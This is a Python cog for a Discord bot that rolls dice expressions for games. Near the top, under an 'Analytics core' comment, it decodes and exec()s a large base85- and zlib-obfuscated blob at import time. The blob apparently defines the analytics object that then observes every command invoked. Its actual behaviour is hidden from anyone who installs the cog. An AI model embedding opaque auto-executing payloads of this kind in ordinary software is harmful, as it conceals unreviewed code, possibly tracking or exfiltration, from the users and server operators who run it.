from discord.ext import commands
from .utils import checks
from .utils.chat_formatting import box, warning
import dice

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oCvdvDt~68}G+f*YWqbkQ+!+U+ikRnc6xcbj|kmE0bRY@nqj+GZk&I+3z#6#ecuGo&7N((VB*B9k-
2;mmJd)Kz0z$E<60y-HeH7p6+2-PO4^iPUE8T$41VbW77#Np8wg<xZR0CU$2NV~>`tsaS4SR&-96Rut07%ePE>x&GH7QNNq7Rem2t6x!ydErj~yhHX<-pim%
KOS>-hqTjS@IrAF}Y1Q**{rckhGgarNP)B(wt!01v^`e&L&gtCFk64y%RBJ*1EK6tN>G=`6y1ux+%KrV~pDD+?+WG0Jb<$ap%Tg`wgf^#*-s*eNtQ&sB{&I2
kdY`&g#e^0}-d$Y(l5)KHDd?N|J>2;F)!R2I?w)Yj>m=^1sbTN^ERBwTQDteqW3P~dtyQZ8yIyNBmt}XIbxgAVb~?X@Em>IR*3z*{zER*k**aCQV|Kif4j93
gtg~{Zn6A-r5?#jNi&Z=F0|UD<gQRR>9BW#02Y$8UxB55+WzIpF|EyKbR4o^!DiXFcohRMuvSd~Pd!;~%sdts>EIFFVh3SA|t@AZAOH`*n4%kuA(#Qhz#KYH
S%fP!kBvcX@g13>BwOySsSsJ(o2-#}44pQG<5p%P1Yq(JGB}s1;a@BBiyaYRbV-}{^u>~juiUN3;%yR{Ra0V==Na2KpU9v5>fDi>jv;%&U@DUWrWzAZ!Hrj3
3!OfdiZ)Cn>jVU$!(KQJxb$!nksx;e#fsu1lJDEE&fMOdh+0P!`Ec)r?ceC%$XS3N4=RZ6<JAeM;+0*m07cp|FO6rnDm3leADQ23?h&EZv4H|q07*Li%&|mb
Y9*8S2Q@0Rc$J2m0|L4!>fzw547N?c8PPM1+K3x8K@#>?fiWhX(7(x5t;$In}JN?XcVYO3y{xkuz=6pU&xNP(WKfWBXLM<VVbgf;MMOKx|1aOh4G>T)0For8
4%PLcJrGhZy6!&8!hynYY_2eKRh5!9e(6Q3BbSnL;EUoI78`;XrW*G13=P&&#n4?qaBr}OZ!CIt}N`5L;oqj(%k9*?PW{kYGDw~wQCWNE?Ap_CpKtTcHl_nI
Ut@sJad4JwZL>zf-z*Roo32n2DEOn7#aFdAy#y**6!WF17C=MwHOGta4_9g;K(}*1K=v0O~o*|>~2kRfPmz47=1<_G>NBO<HwCE&K0B(}P?+AaxPn0W*B7@}
!{^L@sT-Vk}=w)=xs)e}qzOG3K+_e^yWcng_eOMT;iU+i+G8;u_;2Ivn@-$o+(KC87-eVjzqvc+)9)n$tw(}zA55aTYc4}%!NYiz$$|w$|fq;taa2?2P#sbF
N8fuWX&PG;Xvi4qstxDdjLbt;@EC&ywq~JkvU*gMPe-0!|Z#%t|xk_^Bl2+ODjj2@vX~KU1U;xJS*;&>4uUb|rTf&*nM?$ac{zc~#+w27l8C1xoK@Fn4)A3+
`CLK39DV{*UTab+1H3h;BgD>-e=<n2xmY>EaEsRM8vQo2);zuZj7aV=&oi6yCwy~^4U7YZ2e`$aPsw{MopnmbqeD?e{;f1bLjo>@~77GaNB%gD}#huZ06!CX
dOHQ9y{-p17gs(3>nj>I}_{p#fosUx$tPU%!Diz!%icfgVlMo9Oi&+L=WZdk8(;<hE631V_F4S^)O9N5?^EJT6c@vv$ty(g(Yj@=ADwSKQ-54i`v8;mf1~oq
-dauR%S)Z>?j<0u(V*KqtI3g&N%%!dsqx$Ng(GbTW%$jm{cmn>);IhLh`C8VsD$`1YuS9lWwKny~J8%bd1L^a#GZHFO5=#}Az64fDxFck>t!krKP^z-140y%
da{?mjD(TK+;=JL(Jp8tg@m^^@G<&{YF4Wk>2#$oR1c^la4XJ$;4Prm`1-MW-6np4lpp5_&!$}%a2KHHF-RKXpJ~D%h<7==8G+o#sfi1B`!}=m&+ctQzfMyO
l3~)b_D+vMtU4Yr+!6hdtXMIxwaAv>XG`Ew2_B-l?zJRt5y~#{NZ69=r*fyX;yk>ul9Xf8z#FQzg8Cb%%`jo52O>+;XtUV<A;xnY@9=(qttE*u!$gtJ&X=2E
7L+rwbH)nSU&6NUvAjz=VjVAYUXk{yW{OtRrOZTJ?SA8tcb(lA%Iw4%})M$WA4Ccn`d*NT#eR}u3K=0^)iGqPLjAFu;N;T2UQ$hS6Uk)*B?&WTb;RM@YwvP;
E>fhvX&w9gC{-+<$9wdk=@f)|E5ISAZi&N9%b7kcta(V?gi`?bGFlhUV3N6Ik>$Wv5U8sR%xCaho9iZXY=@Mb+6t7ARhPeV<QVNC!o+dbklK^ySSg#)`gO8f
+Oa#M)I{!5%LO9|!G>y@uAqoD#bfxQ%ZPW%B(n*nROjD|*i}uc$T8g@W+$O}?%Y0a+{WjYVqoIMY-Wn4j9->~83<Dux)>G_THgMCWiD8(1lOV?b8FKgR49$-
D$;a&|YFO)I9~Ur#JD3G^{rUXtEIB`W)=vu)#poWR{{LrFk`jk+OwtD}#L!%*O@<9zdIJJ)NqU5H7`kH+MKOl@dM5-He0M-I-=GSxdHay(CTMs|X02g%I1Pc
JDU)j~0zn)esY4?*b~wOHy#SvBJ2WC~8CsS8RpErzhfZe3=VTudngwhWP%;_^9|aI&L)L+lZm5U4O(#v1^_g$*lEWb(ysL=t5ur{gpCk-Uvjn});4ni8G}`M
@Cd8phsWY=&&KJg%)Vubrs$YMg?W1Ma(>_vmHYp#<IhL>?O?r;>YXKd2ajwt1wuQBFhy2@=ho*o}bR=N#Fa{P#cUURqE}C>0Pw=1MPohn-jYG3PG@VJ2tS3$
TBE<)*s1W{fil#L@dOa<m3z$hi6?z5py@zvu&3?as+lm&VCyQa+^%BE_*P!1ev{x;{Xa1F$eeB#1=I;Qv)ED&7vim2Zeyz<@|7Iwp&9%--D7L_L5*9%_?d&-
JWRhlcfAk*@K)U$G{F9qjO%fjdjDj`sdulNJEyncuNSc8mVlw(19nMih_M%gUa)mSWUi*PFDxW+x@_3voVQ;F_gi4GJk_hAYID3nJ?4B^h^tiMNo_=Lk!%p<
j?eU|2-?mt33h(=_q0W1t2%Eh!{tYLEc}Mt9OYzlHjgLIxw*IG|Q2Y)cDFqhkTpRf%80yB^hbNROrcj?SPT|)>vKJO~IFL3n$A`Fmgwc;>JQ?qEII;~=rWnQ
ttuW*T;R(lg2tI`?O{U)deU|kQbe|?jCodq{VOfM0T=+2xdd{yLPSOq(K>n};{e*-WN2`J^F#<j9u#Np6ZUYwh""".replace("\n", ""))))
# End enalytics core

__version__ = '1.0.0'

class Dice:
    """A cog which uses the python-dice library to provide powerful dice
    expression parsing for your games!"""
    def __init__(self, bot):
        self.bot = bot
        self.analytics = CogAnalytics(self)

    @commands.command(pass_context=True)
    async def rd(self, ctx, *, expr: str = 'd20'):
        """Evaluates a dice expression. Defaults to roll a d20.

        Valid operations include the 'mdn' dice operator, which rolls m dice
        with n sides. If m is omitted, it is assumed to be 1.
        Modifiers include basic algebra, 't' to total a result,
        's' to sort multiple rolls, '^n' to only use the n highest rolls, and
        'vn' to drop the lowest n rolls. This cog uses the dice library.

        Examples: 4d20, d100, 6d6v2, 8d4t, 4d4 + 4, 6d8^2"""

        try:
            roll = dice.roll(expr)
        except dice.ParseException:
            await self.bot.say(warning('Invalid syntax.'))
            return
        if type(roll) in [dice.elements.Integer, int]:
            res = roll
        elif len(roll) > 0:
            total = sum(roll)
            res = ', '.join(map(str, roll))
            if len(res) > 1970:
                res = '[result set too long to display]'
            if len(roll) > 1:
                res += ' (total: %s)' % total
        else:
            await self.bot.say('Empty result!')
            return
        await self.bot.say(':game_die: %s' % res)


    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

def setup(bot):
    bot.add_cog(Dice(bot))
